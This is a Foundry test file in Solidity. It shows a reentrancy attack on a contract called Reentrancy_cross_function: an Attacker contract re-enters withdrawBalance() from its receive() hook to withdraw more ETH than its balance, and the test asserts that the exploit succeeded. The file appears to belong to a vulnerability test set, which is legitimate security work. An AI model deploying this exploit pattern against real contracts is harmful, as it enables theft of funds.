
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Reentrancy_cross_function} from "../src/Reentrancy_cross_function.sol";

contract TestReentrancyReentrancy_cross_function is Test {
    
    Reentrancy_cross_function public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrancy_cross_function();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // Limit attackVal to a reasonable range to avoid overflow issues in setup
        vm.assume(attackVal > 0.1 ether && attackVal < 100 ether);

        // Fund the Victim so it has enough ETH to be stolen (at least 2x the attack amount)
        vm.deal(address(_contractUnderTest), attackVal * 2);
        
        // Fund the Attacker for gas
        vm.deal(address(_attacker), 1 ether);

        // Fund the Test Contract
        vm.deal(address(this), 1 ether);

        // Since the contract has no public deposit function, we inject the balance directly into the private mapping.
        // 'userBalances' is the first state variable, so it is at slot 0.
        // Mapping storage location: keccak256(abi.encode(key, slot))
        bytes32 slot = keccak256(abi.encode(address(_attacker), uint256(0)));
        vm.store(address(_contractUnderTest), slot, bytes32(attackVal));
        
        _attacker.setupAttack(attackVal);
        _attacker.attack();

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrancy_cross_function public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;
    uint256 public initialBalance;

    constructor(address victimAddress) { 
        _victim = Reentrancy_cross_function(victimAddress);
    }

    function setupAttack(uint256 val) public {
        storedAttackVal = val;
        attackCallCount = 0;
        exploitSucceeded = false;
    }

    function attack() public {
        initialBalance = address(this).balance;

        // Trigger the vulnerability
        _victim.withdrawBalance();

        // Verify Success: If we have more balance than initial + 1 withdrawal, we successfully re-entered
        if (address(this).balance > initialBalance + storedAttackVal) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        // Re-enter once
        if (attackCallCount < 1) {            
            attackCallCount++;
            _victim.withdrawBalance();
        }
    }
}
